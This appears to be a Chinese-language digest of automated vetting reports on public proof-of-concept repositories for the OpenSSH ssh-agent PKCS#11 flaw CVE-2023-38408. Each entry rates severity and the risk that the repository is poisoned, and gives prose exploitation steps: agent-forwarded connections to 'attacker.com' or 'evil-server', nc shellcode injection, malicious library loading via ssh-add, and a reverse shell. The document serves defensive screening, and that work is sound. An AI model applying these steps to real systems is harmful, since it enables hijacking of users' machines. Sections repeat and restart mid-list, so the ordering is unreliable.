**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
